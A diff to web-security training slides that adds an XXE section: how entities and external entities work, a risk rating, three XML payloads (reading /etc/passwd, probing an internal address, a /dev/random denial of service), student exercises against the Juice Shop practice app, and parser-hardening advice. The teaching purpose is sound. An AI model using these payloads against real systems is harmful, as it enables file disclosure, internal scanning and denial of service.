@@ -6,6 +6,145 @@
 
 <!-- footer: Copyright (c) by Bjoern Kimminich | Licensed under CC-BY-SA 4.0 -->
 
+# XXE
+
+## (XML External Entities)
+
+---
+
+# XML Entities
+
+* In the DTD you specify shortcuts as `ENTITY`...
+  * `<!ENTITY author "Bjoern Kimminich">`
+  * `<!ENTITY copyright "(C) 2018">`
+
+* ...to later dereference them in the XML
+  * `<author>&author; &copyright;</author>`
+
+---
+
+# External Entities
+
+* DTD changed to use External Entities...
+  * `<!ENTITY author SYSTEM "http://owasp-juice.shop/entities.dtd">`
+  * `<!ENTITY copyright	SYSTEM http://owasp-juice.shop/entities.dtd">`
+
+* ...whereas the XML stays the same
+  * `<author>&author; &copyright;</author>`
+
+---
+
+# [Attack Vector XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
+
+* Many older or poorly configured XML processors evaluate external entity references within XML documents
+
+* External entities can be abused for
+  * disclosure of internal files
+  * internal port scanning
+  * remote code execution
+  * denial of service attacks
+
+---
+
+# Risk Rating
+
+## XML External Entities (XXE)
+
+| Exploitability                 | Prevalence                    | Detecability      | Impact              | Risk                                                                             |
+|:-------------------------------|:------------------------------|:------------------|:--------------------|:---------------------------------------------------------------------------------|
+| :large_orange_diamond: Average | :large_orange_diamond: Common | :red_circle: Easy | :red_circle: Severe | [A4](https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)) |
+| ( **2**                        | + **2**                       | + **3** ) / 3     | * **3**             | = **7.0**                                                                        |
+
+
+---
+
+# XML with Attack Payloads
+
+## Extracting Data
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <foo>&xxe;</foo>
+```
+
+---
+
+## Network Probing
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
+    <foo>&xxe;</foo>
+```
+
+## DoS Attack (against Linux-based Systems)
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///dev/random" >]>
+    <foo>&xxe;</foo>
+```
+
+---
+
+# Exercise 7.1
+
+1. Identify the weak point of the application that accepts arbitrary XML data as input (:star::star:)
+2. Retrieve the content of your local system‘s `C:\Windows\system.ini` (or `/etc/passwd` if you are using Linux) via an XEE attack (:star::star::star:)
+
+---
+
+# [Prevention](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)
+
+* **Configure XML parser to**
+  * **disable DTDs completely** (by disallowing `DOCTYPE` declarations) :100:
+  * disable External Entities (only if allowing DTDs cannot be avoided)
+
+:x: Selective validation or escaping of tainted data is **not** sufficient, as the whole XML document is crafted by the attacker!
+
+---
+
+# [XML Parser Hardening Examples](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)
+
+#### `libxml2` (C/C++)
+
+* `XML_PARSE_NOENT` and `XML_PARSE_DTDLOAD` must **not be defined** in the Enum `xmlParserOption`.
+
+_:information_source: Starting with release `2.9` entity expansion is disabled by default. Using any older version makes it more likely to have XXE problems if the configuration was not explicitly hardened._
+
+
+---
+
+<!-- *footer: -->
+
+#### `org.dom4j.io.SAXReader` (Java)
+
+```java
+saxReader.setFeature(
+  "http://apache.org/xml/features/disallow-doctype-decl", true);
+saxReader.setFeature(
+  "http://xml.org/sax/features/external-general-entities", false);
+saxReader.setFeature(
+  "http://xml.org/sax/features/external-parameter-entities", false);
+```
+
+#### `java.beans.XMLDecoder` (Java)
+
+* The `readObject()` method in this class is fundamentally unsafe
+* It is vulnerable against XXE as well as arbitrary code execution
+* There is no way to make use of this class safe
+
+_:warning: Most Java XML parsers have insecure parser settings by default!_
+
+---
+
 # Deserialization
 
 ---
@@ -73,7 +212,7 @@ public class JFrame {
 
 ---
 
-# Exercise 6.1
+# Exercise 7.2
 
 1. What happens when the `root` object would be deserialized?
 
@@ -85,7 +224,7 @@ ArrayList<Object> root = new ArrayList<>(Integer.MAX_VALUE);
 
 <!-- *footer:  -->
 
-# Exercise 6.2
+# Exercise 7.3
 
 1. What happens when the `root` object would be deserialized?
 
@@ -162,10 +301,13 @@ _:warning: The affected version `0.0.4` of `node-serialize` is also the latest v
 
 ---
 
-# Exercise 6.3
+# Exercise 7.4
 
-1. Find the „NextGen“ successor to the half-heartedly deprecated XML-based B2B API in the Juice Shop
-2. Exploit this API with a DoS-like Remote Code Exeution
+1. Perform a DoS-like Attack using XXE (:star::star::star::star::star:)
+
+<!-- -->
+
+2. Find the „NextGen“ successor to the half-heartedly deprecated XML-based B2B API in the Juice Shop (:star::star:)
+3. Exploit this API with at least one successful DoS-like Remote Code Exeution (:star::star::star::star::star: - :star::star::star::star::star::star:)
 
 _:information_source: If the server would need >2sec to process your attack request, it is considered „DoS-like“ enough._
-
